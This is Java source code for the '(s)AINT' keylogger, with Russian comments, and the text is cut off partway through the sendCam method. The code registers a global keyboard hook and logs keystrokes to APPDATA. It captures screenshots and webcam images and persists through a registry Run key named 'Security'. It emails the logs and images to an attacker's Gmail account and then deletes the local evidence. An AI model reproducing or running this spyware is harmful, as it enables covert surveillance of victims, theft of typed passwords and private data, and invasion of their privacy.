package saint.keylogger;

import saint.email.SendEmail;
import saint.screenshot.Screenshot;
import saint.webcam.Cam;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.channels.FileChannel;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author tiagorlampert
 */
public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {

    // Форматы даты для логов и скриншотов
    private static DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
    private static DateFormat dateFormatHour = new SimpleDateFormat("yyyy-MM-dd HH-mm-ss");
    // Папки и пути для сохранения данных
    private static String folder = "\\(s)AINT";
    private static String environment_variable_path = "APPDATA";
    private static String path_logs = "\\Logs\\";
    private static String path_screenshot = "\\Screenshot\\";
    private static String path_cam = "\\Cam\\";
    private static String app_path;
    private static String nameFileScreenshot;
    private static String nameFileCam;
    // Переменные для хранения логов и отправки данных
    private static String logs = "";
    private static String logs_send = "";
    // Параметры для отправки электронной почты
    private static String smtp = "smtp.gmail.com";
    private static String email_from = "email@gmail.com";
    private static String email_password = "passwordemail";
    private static String email_to = "email@gmail.com";
    private static String subject = "(s)AINT";
    private static String port = "";
    private static int cam_width = 640;
    private static int cam_height = 480;
    private static int count = countNumber;
    private static int count_state = 0;
    private static boolean ssl = true;
    private static boolean tls = false;
    private static boolean debug_email = true;
    private static boolean screenshot = booleanScreenshot;
    private static boolean cam = booleanCam;
    private static boolean persistence = booleanPersistence;
    private static boolean keepdata = booleanKeepData;
    private static String name_jar = "\\saint.jar";

    public static void main(String[] args) throws IOException {
        detectOS();

        app_path = System.getenv(environment_variable_path) + folder;

        createFolder(app_path);
        createFolder(app_path + path_logs);
        createFolder(app_path + path_screenshot);
        createFolder(app_path + path_cam);

        if (persistence == true) {
            copyFile(Keylogger.class.getProtectionDomain().getCodeSource().getLocation().getPath(), app_path + name_jar);
        }

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            java.util.logging.Logger.getLogger(Keylogger.class.getName()).log(Level.SEVERE, null, ex);
        }
        GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());
    }

    // Метод для копирования файла
    private static void copyFile(String source, String dest) {
        File jar_file = new File(app_path + name_jar);
        if (!jar_file.exists()) {
            File sourceFile = new File(source);
            File destFile = new File(dest);
            FileChannel sourceChannel = null;
            FileChannel destChannel = null;
            try {
                sourceChannel = new FileInputStream(sourceFile).getChannel();
                destChannel = new FileOutputStream(destFile).getChannel();
                destChannel.transferFrom(sourceChannel, 0, sourceChannel.size());
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                Runtime.getRuntime().exec("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Security\" /t REG_SZ /F /D \""+app_path+name_jar+"\"");
            } catch (IOException ex) {
                System.out.println(ex.getMessage());
            }
        }
    }

    // Метод для создания папки
    private static void createFolder(String path) {
        new File(path).mkdir();
    }

    // Метод для удаления папки и её содержимого
    private static void deleteFolder(String path) {
        File folder = new File(path);
        File[] files = folder.listFiles();
        for (File file : files) {
            file.delete();
        }
    }

    // Метод для удаления данных, если keepdata = false
    private static void deleteData() {
        if (!keepdata) {
            deleteFolder(app_path + path_logs);
            deleteFolder(app_path + path_screenshot);
            deleteFolder(app_path + path_cam);
        }
    }

    // Метод для определения операционной системы
    private static void detectOS() {
        if (!System.getProperty("os.name").toLowerCase().contains("windows")) {
            System.out.println("[!] OS is not supported!");
            System.exit(0);
        }
    }

    // Метод для сохранения логов
    public void SaveLogs(String c) {
        logs += c;
        count_state += 1;
        try (BufferedWriter bw = new BufferedWriter(new FileWriter(app_path + path_logs + dateFormat.format(new Date()) + ".txt", true))) {
            bw.write(c);
        } catch (IOException e) {
            e.printStackTrace();
        }

        // System.out.println("Logs: " + logs);
        // System.out.println("Count: " + count_state);

        if (count_state >= count) {
            count_state = 0;
            logs_send = logs;
            logs = "";

            if (screenshot == true && cam == true) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendAll();
            } else if (screenshot == true && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendScreenshot();
            } else if (screenshot == false && cam == true) {

                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                sendCam();
            } else if (screenshot == false && cam == false) {
                Thread.currentThread().setContextClassLoader(getClass().getClassLoader());
                send();
            }
        }
    }

    // Метод для отправки всех данных (логи, скриншоты, камера)
    public void sendAll() {
        try {
            nameFileScreenshot = dateFormatHour.format(new Date()).toString();
            Screenshot.TakeScreenshot(app_path + path_screenshot, dateFormatHour.format(new Date()));

            nameFileCam = dateFormatHour.format(new Date()).toString();
            Cam.Capture(app_path + path_cam, dateFormatHour.format(new Date()), cam_width, cam_height);

        } catch (Exception ex) {
            System.out.println(ex.getMessage());
        }
        new Thread(() -> {
            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
            e.sendEmailAttachment(
                    email_to,
                    subject,
                    logs_send,
                    app_path + path_screenshot + nameFileScreenshot + ".jpg",
                    app_path + path_cam + nameFileCam + ".png",
                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
            );
            deleteData();
        }).start();
    }

    // Метод для отправки логов и скриншотов
    public void sendScreenshot() {
        try {
            nameFileScreenshot = dateFormatHour.format(new Date()).toString();
            Screenshot.TakeScreenshot(app_path + path_screenshot, dateFormatHour.format(new Date()));
        } catch (Exception ex) {
            System.out.println(ex.getMessage());
        }
        new Thread(() -> {
            SendEmail e = new SendEmail(smtp, email_from, email_password, port, ssl, tls, debug_email);
            e.sendEmailAttachment(
                    email_to,
                    subject,
                    logs_send,
                    app_path + path_screenshot + nameFileScreenshot + ".jpg",
                    app_path + path_logs + dateFormat.format(new Date()) + ".txt"
            );
            deleteData();
        }).start();
    }

    // Метод для отправки логов и данных с камеры
    public void sendCam() {
        try
